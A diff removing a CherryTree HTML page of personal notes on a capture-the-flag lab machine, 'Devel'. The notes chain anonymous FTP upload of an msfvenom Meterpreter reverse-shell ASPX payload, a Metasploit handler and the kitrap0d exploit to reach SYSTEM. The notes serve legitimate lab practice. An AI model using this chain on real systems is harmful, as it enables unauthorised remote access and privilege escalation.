@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>10.10.10.5 Devel</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>10.10.10.5 Devel</h1><br/>Devel<br />ssh -sC -sV -oN /root/Desktop/10.10.10.5.txt 10.10.10.5<br />    ftp anonymous was open<br />        put verified<br />    http iis7.5<br />    <br />    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.60 lport=6969 -f aspx -o Yeetdevel.aspx<br />    cd /root/Desktop/Shellcodes<br />    ftp 10.10.10.5<br />        anonymous<br />        put Yeetdevel.aspx<br />    msfconsole<br />        use exploit/multi/handler<br />            set payload windows/meterpreter/reverse_tcp<br />            lhost 10.10.14.60<br />            lport 6969<br />            run<br />            SESSION CREATED<br />                iis user<br />        search suggest<br />        use post/multi/recon/local_exploit_suggester<br />            set session 1<br />            run<br />                kitrap0d recomended (service could not be verified)<br />       use windows/local/ms10_015_kitrap0d<br />           set session 1<br />           set lport 4444<br />           set lhost 10.10.14.60<br />           run<br />           SYSTEM SESSION CREATED<br />flags found and submitted<br />        </div></body></html>
